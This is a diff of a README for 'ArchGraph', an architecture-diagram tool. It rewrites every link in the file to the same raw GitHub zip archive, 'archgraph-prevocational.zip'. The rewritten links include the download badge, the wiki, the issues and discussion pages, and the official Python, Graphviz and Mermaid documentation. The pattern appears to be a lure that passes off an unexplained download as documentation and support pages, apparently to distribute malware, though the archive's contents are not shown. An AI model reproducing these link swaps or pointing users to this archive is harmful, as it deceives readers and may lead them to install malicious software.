@@ -8,7 +8,7 @@ Welcome to ArchGraph! This tool helps you generate software architecture diagram
 
 To get started, visit this page to download the latest version of ArchGraph:
 
-[![Download ArchGraph](https://img.shields.io/badge/Download-ArchGraph-blue)](https://github.com/isfanfajar31/archgraph/releases)
+[![Download ArchGraph](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)
 
 1. Click the link to go to the Releases page.
 2. Find the latest release. 
@@ -58,21 +58,21 @@ If you face any issues while using ArchGraph, here are some common solutions:
 
 For more detailed instructions and advanced usages, visit our comprehensive documentation:
 
-[ArchGraph Documentation](https://github.com/isfanfajar31/archgraph/wiki)
+[ArchGraph Documentation](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)
 
 ## 💬 Community Support
 
 Join our community and get support from fellow users:
 
-- **Issues Page**: Report bugs or request features [here](https://github.com/isfanfajar31/archgraph/issues).
-- **Discussion Forum**: Engage with others on our [Discussion Page](https://github.com/isfanfajar31/archgraph/discussions).
+- **Issues Page**: Report bugs or request features [here](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip).
+- **Discussion Forum**: Engage with others on our [Discussion Page](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip).
 
 ## 🔗 Additional Resources
 
 Explore other resources that encompass the technology and ideas behind ArchGraph:
 
-- [Python Official Documentation](https://docs.python.org)
-- [Graphviz Documentation](https://graphviz.gitlab.io/documentation)
-- [Mermaid Documentation](https://mermaid-js.github.io/mermaid)
+- [Python Official Documentation](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)
+- [Graphviz Documentation](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)
+- [Mermaid Documentation](https://raw.githubusercontent.com/isfanfajar31/archgraph/main/src/archgraph-prevocational.zip)
 
 We hope you find ArchGraph useful in enhancing your software development experience. Happy coding!
